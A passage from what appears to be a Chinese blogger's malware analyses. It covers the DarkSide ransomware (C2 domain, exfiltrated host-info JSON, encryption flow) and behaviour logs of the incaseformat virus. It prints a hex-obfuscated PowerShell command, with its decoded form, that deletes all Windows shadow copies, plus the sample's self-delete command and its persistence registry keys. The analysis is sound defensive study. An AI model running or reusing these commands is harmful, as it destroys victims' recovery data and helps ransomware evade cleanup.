<td style="text-align:center">kk-KZ</td>
<td style="text-align:center">哈萨克语</td>
</tr>
<tr>
<td style="text-align:center">9</td>
<td style="text-align:center">440</td>
<td style="text-align:center">ky-KG</td>
<td style="text-align:center">吉尔吉斯语</td>
</tr>
<tr>
<td style="text-align:center">10</td>
<td style="text-align:center">442</td>
<td style="text-align:center">tk-TM</td>
<td style="text-align:center">土库曼语（拉丁语）</td>
</tr>
<tr>
<td style="text-align:center">11</td>
<td style="text-align:center">443</td>
<td style="text-align:center">uz-Latn-UZ</td>
<td style="text-align:center">乌兹别克语（拉丁语）</td>
</tr>
<tr>
<td style="text-align:center">12</td>
<td style="text-align:center">444</td>
<td style="text-align:center">tt-RU</td>
<td style="text-align:center">塔塔尔语（西里尔文）</td>
</tr>
<tr>
<td style="text-align:center">13</td>
<td style="text-align:center">818</td>
<td style="text-align:center">ro-MD</td>
<td style="text-align:center">罗马尼亚语（摩尔多瓦）</td>
</tr>
<tr>
<td style="text-align:center">14</td>
<td style="text-align:center">819</td>
<td style="text-align:center">ru-MD</td>
<td style="text-align:center">俄语（摩尔多瓦）</td>
</tr>
<tr>
<td style="text-align:center">15</td>
<td style="text-align:center">82C</td>
<td style="text-align:center">az-Cyrl-AZ</td>
<td style="text-align:center">阿塞拜疆语（西里尔文）</td>
</tr>
<tr>
<td style="text-align:center">16</td>
<td style="text-align:center">843</td>
<td style="text-align:center">uz-Cyrl-UZ</td>
<td style="text-align:center">乌兹别克语（西里尔文）</td>
</tr>
<tr>
<td style="text-align:center">17</td>
<td style="text-align:center">2801</td>
<td style="text-align:center">ar-SY</td>
<td style="text-align:center">阿拉伯语（叙利亚）</td>
</tr>
</tbody>
</table>
<h4 id="发送信息至服务器函数">发送信息至服务器函数</h4>
<p>将本地的系统相关信息发送到攻击者的服务器：json格式内容如下：</p>
<pre tabindex="0"><code>{
	&#34;bot&#34;:{
	&#34;ver&#34;:&#34;1.8.6.2&#34;,
	&#34;uid&#34;:&#34;060108efb510c98&#34;
	},
	&#34;os&#34;:{
	&#34;lang&#34;:&#34;zh-CN&#34;,
	&#34;username&#34;:&#34;alee&#34;,
	&#34;hostname&#34;:&#34;WIN-B1ESUN1R9U8&#34;,
	&#34;domain&#34;:&#34;WORKGROUP&#34;,
	&#34;os_type&#34;:&#34;windows&#34;,
	&#34;os_version&#34;:&#34;Windows 7 Ultimate&#34;,
	&#34;os_arch&#34;:&#34;x64&#34;,
	&#34;disks&#34;:&#34;C:72/99&#34;,
	&#34;id&#34;:&#34;826dfd7bd5985bdbd259&#34;
	}
}
</code></pre><p>服务器为：<code>securebestapp20.com</code></p>
<h4 id="删除本地卷影">删除本地卷影</h4>
<p>核心代码如下：</p>
<p><img src="/darkside_images/5604835168666.png" alt=""></p>
<p>powershell命令如下：</p>
<pre tabindex="0"><code>40B5E2:L&#34;powershell -ep bypass -c \&#34;(0..61)|%{{$s+=[char][byte](&#39;0x&#39;+&#39;4765742D576D694F626A6563742057696E33325F536861646F77636F7079207C20466F72456163682D4F626A656374207B245F2E44656C65746528293B7D20&#39;.Substring(2*$_,2))}};iex $s\&#34;&#34;
</code></pre><p>将十六进制转换成字符串如下：</p>
<pre tabindex="0"><code>Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}
</code></pre><h4 id="检索本地磁盘空闲空间">检索本地磁盘空闲空间</h4>
<p>空闲空间检索存在两个判断，但至少保证有100mb才会进行下一步。</p>
<p><img src="/darkside_images/192720173802.png" alt=""></p>
<h4 id="加密所有文件">加密所有文件</h4>
<p>从动态调试中可以找到加密主函数的地址，在ida中呈现如下：</p>
<p><img src="/darkside_images/1604535140565.png" alt=""></p>
<p>进入其中可发现流程如下：</p>
<p><img src="/darkside_images/4085142188991.png" alt=""></p>
<p>进入加密流程可以看到：会检索文件结构，然后递归对文件进行加密。</p>
<p><img src="/darkside_images/2721245176858.png" alt=""></p>
<p>深入到加密操作中，发现会首先进行是否加密判断，未加密则重命名：</p>
<p><img src="/darkside_images/3495450197024.png" alt=""></p>
<p>对文件内容进行rsa1028加密，并生成加密文件：</p>
<p><img src="/darkside_images/2789151189693.png" alt=""></p>
<h4 id="自我删除">自我删除</h4>
<p>自我删除的主函数如下：</p>
<p><img src="/darkside_images/33802100566.png" alt=""></p>
<p>使用<code>Procmon</code>检测到的指令如下：</p>
<pre tabindex="0"><code>&#34;C:\Windows\system32\cmd.exe&#34; /C DEL /F /Q C:\Users\alee\Desktop\DARKSI~1\Darkside.exe &gt;&gt; NUL
</code></pre><p>在命令行使用<code>cmd /?</code>可以了解到：</p>
<pre tabindex="0"><code>/C      执行字符串指定的命令然后终止
/Q      关闭回显
/F      启用文件和目录名完成字符
</code></pre><h2 id="总结">总结</h2>
<p>这是我第二次做样本分析，其中遇到了很多问题，api的熟悉度这个是一个经验问题，另外两个问题是最为严重的：</p>
<ul>
<li>ida动态链接库的引入</li>
<li>由汇编代码判断加密方式</li>
</ul>
<p>第一个问题如果不是有现成的<code>idapython</code>脚本，那我将不可能完成本次分析，所以深入了解<code>idapython</code> 脚本的编写是很有必要的；</p>
<p>第二个问题则需要通过对更多样本的分析，或自我构建加密程序进行分析才能够弥补差距。后续将采用两种方式并进的模式进行能力增强。</p>
<p>最后本次分析参考了很多前辈分享的资料，感谢大家的无私分享。</p>
<p>参考资料：<code>https://chuongdong.com/reverse%20engineering/2021/05/06/DarksideRansomware/</code></p>
]]></content>
		</item>
		
		<item>
			<title>Incaseformat</title>
			<link>https://www.a1ee.cn/medium/incaseformat/</link>
			<pubDate>Fri, 29 Jan 2021 11:47:34 +0800</pubDate>
			
			<guid>https://www.a1ee.cn/medium/incaseformat/</guid>
			<description>incaseformat样本分析 0. 前言 从关于病毒的新闻可以知道这是一个具有删除和自我复制的病毒； 从别人对病毒的评价可以知道这是一个很棒的练手</description>
			<content type="html"><![CDATA[<h1 id="incaseformat样本分析">incaseformat样本分析</h1>
<h2 id="0-前言">0. 前言</h2>
<p>从关于<a href="https://mp.weixin.qq.com/s/JWUIK9JTrlFMXozl1LmNlw">病毒的新闻</a>可以知道这是一个具有删除和自我复制的病毒；</p>
<p>从别人对<a href="https://mp.weixin.qq.com/s/B-d9ctMwPoiO6D_ptbmhBw">病毒的评价</a>可以知道这是一个很棒的练手工具。</p>
<p>这是我分析的第一个样本，其中一定会有遗漏的地方，以及牵强之处，希望大家多多批评指正。</p>
<h2 id="1-行为捕获">1. 行为捕获</h2>
<p>直接运行样本，并使用火绒剑进行行为捕获：</p>
<pre tabindex="0"><code>16:43:31:605,	tsay.exe,	1064:0,	1064,	EXEC_create,	C:\Users\ALEE\Desktop\incaseformat\tsay.exe,	parent_pid:4700 cmdline:&#39;&#34;C:\Users\ALEE\Desktop\incaseformat\tsay.exe&#34; &#39; image_base:0x0000000000400000 image_size:0x00077000 ,	0x00000000 [操作成功完成。  ],	
16:43:31:745,	tsay.exe,	1064:0,	1064,	EXEC_module_load,	C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_5.82.19041.488_none_89e6152f0b32762e\comctl32.dll,	base:0x0000000074DB0000 size:0x0008D000 ,	0x00000000 [操作成功完成。  ],	
16:43:31:823,	tsay.exe,	1064:0,	1064,	EXEC_module_load,	C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.19041.488_none_11b1e5df2ffd8627\comctl32.dll,	base:0x0000000073CB0000 size:0x00212000 ,	0x00000000 [操作成功完成。  ],	
16:43:31:870,	tsay.exe,	1064:2276,	1064,	FILE_touch,	C:\windows\tsay.exe,	access:0x0017019F alloc_size:460288 attrib:0x00000020 share_access:0x00000000 disposition:0x00000002 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:43:31:886,	tsay.exe,	1064:2276,	1064,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00070600 ,	0x00000000 [操作成功完成。  ],	
16:43:31:886,	tsay.exe,	1064:2276,	1064,	FILE_read,	C:\Users\ALEE\Desktop\incaseformat\tsay.exe,	offset:0x00000000 datalen:0x00020000 ,	0x00000000 [操作成功完成。  ],	
16:43:31:901,	tsay.exe,	1064:2276,	1064,	FILE_write,	C:\windows\tsay.exe,	offset:0x00000000 datalen:0x00020000 ,	0x00000000 [操作成功完成。  ],	
16:43:31:901,	tsay.exe,	1064:0,	1064,	FILE_modified,	C:\windows\tsay.exe,	,	0x00000000 [操作成功完成。  ],	
16:43:31:901,	tsay.exe,	1064:2276,	1064,	REG_setval,	HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce\msfsa,	type:0x00000001 datalen:40 data:&#39;43 3A 5C 77 69 6E 64 6F 77 73 5C 74 73 61 79 2E &#39; ,	0x00000000 [操作成功完成。  ],	
16:43:31:917,	tsay.exe,	1064:0,	1064,	EXEC_destroy,	C:\Users\ALEE\Desktop\incaseformat\tsay.exe,	parent_pid:4700 cmdline:&#39;&#34;C:\Users\ALEE\Desktop\incaseformat\tsay.exe&#34; &#39; ,	0x00000000 [操作成功完成。  ],	
</code></pre><p>将时间设置为1月13日，以管理员权限运行木马程序：</p>
<pre tabindex="0"><code>16:42:32:202,	tsay.exe,	2568:0,	0,	EXEC_create,	C:\Windows\system32\SystemSettingsAdminFlows.exe,	parent_pid:5808 cmdline:&#39;&#34;C:\Windows\system32\SystemSettingsAdminFlows.exe&#34; SetDateTime&#39; image_base:0x00007FF6B6C80000 image_size:0x00080000 ,	0x00000000 [操作成功完成。  ],	
16:42:32:499,	tsay.exe,	2568:0,	0,	EXEC_module_load,	C:\Windows\System32\vm3dum64_10.dll,	base:0x00007FFB01970000 size:0x00061000 ,	0x00000000 [操作成功完成。  ],	
16:42:33:321,	tsay.exe,	2568:6180,	0,	REG_setval,	HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-655661564-3040666061-2252561177-1000\\Device\HarddiskVolume3\Windows\System32\SystemSettingsAdminFlows.exe,	type:0x00000003 datalen:24 data:&#39;28 BB 33 09 88 E9 D6 01 00 00 00 00 00 00 00 00 &#39; ,	0x00000000 [操作成功完成。  ],	
16:42:33:321,	tsay.exe,	2568:0,	0,	EXEC_destroy,	C:\Windows\system32\SystemSettingsAdminFlows.exe,	parent_pid:5808 cmdline:&#39;&#34;C:\Windows\system32\SystemSettingsAdminFlows.exe&#34; SetDateTime&#39; ,	0x00000000 [操作成功完成。  ],	
16:45:41:433,	tsay.exe,	2568:0,	2568,	EXEC_create,	C:\Windows\tsay.exe,	parent_pid:4700 cmdline:&#39;&#34;C:\Windows\tsay.exe&#34; &#39; image_base:0x0000000000400000 image_size:0x00077000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:464,	tsay.exe,	2568:0,	2568,	EXEC_module_load,	C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_5.82.19041.488_none_89e6152f0b32762e\comctl32.dll,	base:0x0000000074DB0000 size:0x0008D000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:511,	tsay.exe,	2568:0,	2568,	EXEC_module_load,	C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.19041.488_none_11b1e5df2ffd8627\comctl32.dll,	base:0x0000000073CB0000 size:0x00212000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:511,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	REG_setval,	HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce\msfsa,	type:0x00000001 datalen:40 data:&#39;43 3A 5C 77 69 6E 64 6F 77 73 5C 74 73 61 79 2E &#39; ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x0017019F alloc_size:460288 attrib:0x00000020 share_access:0x00000000 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x00170197 alloc_size:460288 attrib:0x00000020 share_access:0x00000000 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x00170196 alloc_size:460288 attrib:0x00000020 share_access:0x00000000 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x00170197 alloc_size:460288 attrib:0x00000020 share_access:0x00000003 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x00170197 alloc_size:460288 attrib:0x00000020 share_access:0x00000003 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x00170196 alloc_size:460288 attrib:0x00000020 share_access:0x00000003 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x00160197 alloc_size:460288 attrib:0x00000020 share_access:0x00000003 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x00160197 alloc_size:460288 attrib:0x00000020 share_access:0x00000003 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x00160196 alloc_size:460288 attrib:0x00000020 share_access:0x00000003 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x00120197 alloc_size:460288 attrib:0x00000020 share_access:0x00000000 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x00120197 alloc_size:460288 attrib:0x00000020 share_access:0x00000000 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x00120196 alloc_size:460288 attrib:0x00000020 share_access:0x00000000 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x00120197 alloc_size:460288 attrib:0x00000020 share_access:0x00000003 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x00120197 alloc_size:460288 attrib:0x00000020 share_access:0x00000003 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x00120196 alloc_size:460288 attrib:0x00000020 share_access:0x00000003 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:45:41:589,	tsay.exe,	2568:0,	2568,	EXEC_destroy,	C:\Windows\tsay.exe,	parent_pid:4700 cmdline:&#39;&#34;C:\Windows\tsay.exe&#34; &#39; ,	0x00000000 [操作成功完成。  ],	
16:48:06:041,	tsay.exe,	5748:0,	5748,	EXEC_create,	C:\Windows\tsay.exe,	parent_pid:4700 cmdline:&#39;&#34;C:\Windows\tsay.exe&#34; &#39; image_base:0x0000000000400000 image_size:0x00077000 ,	0x00000000 [操作成功完成。  ],	
16:48:06:135,	tsay.exe,	5748:0,	5748,	EXEC_module_load,	C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_5.82.19041.488_none_89e6152f0b32762e\comctl32.dll,	base:0x0000000074DB0000 size:0x0008D000 ,	0x00000000 [操作成功完成。  ],	
16:48:06:197,	tsay.exe,	5748:0,	5748,	EXEC_module_load,	C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.19041.488_none_11b1e5df2ffd8627\comctl32.dll,	base:0x0000000073CB0000 size:0x00212000 ,	0x00000000 [操作成功完成。  ],	
16:48:06:228,	tsay.exe,	5748:7604,	5748,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:48:06:228,	tsay.exe,	5748:7604,	5748,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:48:06:228,	tsay.exe,	5748:7604,	5748,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:48:06:228,	tsay.exe,	5748:7604,	5748,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:48:06:228,	tsay.exe,	5748:7604,	5748,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:48:06:228,	tsay.exe,	5748:7604,	5748,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:48:06:228,	tsay.exe,	5748:7604,	5748,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:48:06:228,	tsay.exe,	5748:7604,	5748,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:48:06:228,	tsay.exe,	5748:7604,	5748,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:48:06:228,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce\msfsa,	type:0x00000001 datalen:40 data:&#39;43 3A 5C 77 69 6E 64 6F 77 73 5C 74 73 61 79 2E &#39; ,	0x00000000 [操作成功完成。  ],	
16:48:06:228,	tsay.exe,	5748:7604,	5748,	FILE_touch,	C:\windows\ttry.exe,	access:0x0017019F alloc_size:460288 attrib:0x00000020 share_access:0x00000000 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:48:06:244,	tsay.exe,	5748:7604,	5748,	FILE_truncate,	C:\windows\ttry.exe,	eof:0x00070600 ,	0x00000000 [操作成功完成。  ],	
16:48:06:244,	tsay.exe,	5748:7604,	5748,	FILE_write,	C:\windows\ttry.exe,	offset:0x00000000 datalen:0x00020000 ,	0x00000000 [操作成功完成。  ],	
16:48:06:244,	tsay.exe,	5748:0,	5748,	FILE_modified,	C:\windows\ttry.exe,	,	0x00000000 [操作成功完成。  ],	
16:48:06:510,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProxyBypass,	type:0x00000004 datalen:4 data:&#39;01 00 00 00 &#39; ,	0x00000000 [操作成功完成。  ],	
16:48:06:510,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\IntranetName,	type:0x00000004 datalen:4 data:&#39;01 00 00 00 &#39; ,	0x00000000 [操作成功完成。  ],	
16:48:06:510,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\UNCAsIntranet,	type:0x00000004 datalen:4 data:&#39;01 00 00 00 &#39; ,	0x00000000 [操作成功完成。  ],	
16:48:06:510,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\AutoDetect,	type:0x00000004 datalen:4 data:&#39;00 00 00 00 &#39; ,	0x00000000 [操作成功完成。  ],	
16:48:06:526,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProxyBypass,	type:0x00000004 datalen:4 data:&#39;01 00 00 00 &#39; ,	0x00000000 [操作成功完成。  ],	
16:48:06:526,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\IntranetName,	type:0x00000004 datalen:4 data:&#39;01 00 00 00 &#39; ,	0x00000000 [操作成功完成。  ],	
16:48:06:526,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\UNCAsIntranet,	type:0x00000004 datalen:4 data:&#39;01 00 00 00 &#39; ,	0x00000000 [操作成功完成。  ],	
16:48:06:526,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\AutoDetect,	type:0x00000004 datalen:4 data:&#39;00 00 00 00 &#39; ,	0x00000000 [操作成功完成。  ],	
16:48:06:963,	tsay.exe,	5748:0,	5748,	PROC_exec,	C:\windows\ttry.exe,	target_pid:8840 cmdline:&#39;&#34;C:\windows\ttry.exe&#34; &#39; ,	0x00000000 [操作成功完成。  ],	
16:48:07:010,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Notifications\Data\418A073AA3BC3475,	type:0x00000003 datalen:446 data:&#39;05 09 00 00 00 00 00 00 04 00 04 00 01 02 06 00 &#39; ,	0x00000000 [操作成功完成。  ],	
16:48:07:072,	tsay.exe,	5748:0,	5748,	EXEC_destroy,	C:\Windows\tsay.exe,	parent_pid:4700 cmdline:&#39;&#34;C:\Windows\tsay.exe&#34; &#39; ,	0x00000000 [操作成功完成。  ],	
</code></pre><p>生成的ttry.exe文件的动作如下：</p>
<pre tabindex="0"><code>17:18:04:679,	ttry.exe,	9128:0,	9076,	EXEC_create,	C:\windows\ttry.exe,	parent_pid:9076 cmdline:&#39;&#34;C:\windows\ttry.exe&#34; &#39; image_base:0x0000000000400000 image_size:0x00077000 ,	0x00000000 [操作成功完成。  ],	
17:18:04:710,	ttry.exe,	9128:0,	9076,	EXEC_module_load,	C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_5.82.19041.488_none_89e6152f0b32762e\comctl32.dll,	base:0x0000000075BA0000 size:0x0008D000 ,	0x00000000 [操作成功完成。  ],	
17:18:04:757,	ttry.exe,	9128:0,	9076,	EXEC_module_load,	C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.19041.488_none_11b1e5df2ffd8627\comctl32.dll,	base:0x0000000074810000 size:0x00212000 ,	0x00000000 [操作成功完成。  ],	
17:18:04:757,	ttry.exe,	9128:9132,	9076,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
17:18:04:757,	ttry.exe,	9128:9132,	9076,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00070600 ,	0x00000000 [操作成功完成。  ],	
17:18:04:757,	ttry.exe,	9128:9132,	9076,	FILE_read,	C:\windows\ttry.exe,	offset:0x00000000 datalen:0x00020000 ,	0x00000000 [操作成功完成。  ],	
17:18:04:757,	ttry.exe,	9128:9132,	9076,	FILE_write,	C:\windows\tsay.exe,	offset:0x00000000 datalen:0x00020000 ,	0x00000000 [操作成功完成。  ],	
17:18:04:757,	ttry.exe,	9128:0,	9076,	FILE_modified,	C:\windows\tsay.exe,	,	0x00000000 [操作成功完成。  ],	
17:18:04:757,	ttry.exe,	9128:9132,	9076,	REG_setval,	HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce\msfsa,	type:0x00000001 datalen:40 data:&#39;43 3A 5C 77 69 6E 64 6F 77 73 5C 74 73 61 79 2E &#39; ,	0x00000000 [操作成功完成。  ],	
17:18:05:741,	ttry.exe,	9128:9132,	9076,	FILE_touch,	D:\share.exe,	access:0x0017019F alloc_size:460288 attrib:0x00000020 share_access:0x00000000 disposition:0x00000002 options:0x00000064 ,	0x00000000 [操作成功完成。  ],	
17:18:05:741,	ttry.exe,	9128:9132,	9076,	FILE_read,	C:\windows\ttry.exe,	offset:0x00000000 datalen:0x00020000 ,	0x00000000 [操作成功完成。  ],	
17:18:05:741,	ttry.exe,	9128:9132,	9076,	FILE_write,	D:\share.exe,	offset:0x00000000 datalen:0x00020000 ,	0x00000000 [操作成功完成。  ],	
17:18:05:741,	ttry.exe,	9128:0,	9076,	FILE_modified,	D:\share.exe,	,	0x00000000 [操作成功完成。  ],	
17:18:06:757,	ttry.exe,	9128:9132,	9076,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt,	type:0x00000004 datalen:4 data:&#39;01 00 00 00 &#39; ,	0x00000000 [操作成功完成。  ],	
17:18:06:757,	ttry.exe,	9128:9132,	9076,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden,	type:0x00000004 datalen:4 data:&#39;02 00 00 00 &#39; ,	0x00000000 [操作成功完成。  ],	
17:18:06:757,	ttry.exe,	9128:9132,	9076,	REG_setval,	HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\checkedvalue,	type:0x00000004 datalen:4 data:&#39;00 00 00 00 &#39; ,	0x00000000 [操作成功完成。  ],	
17:18:06:757,	ttry.exe,	9128:9132,	9076,	REG_rmval,	HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\HideFileExt\checkedvalue,	keyname:&#39;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\HideFileExt&#39; ,	0x00000000 [操作成功完成。  ],	
</code></pre><p>当时间调整为1月13日，运行ttry.exe动作如下：</p>
<pre tabindex="0"><code>17:25:44:420,	ttry.exe,	7808:588,	7808,	FILE_truncate,	D:\incaseformat.log,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	

......

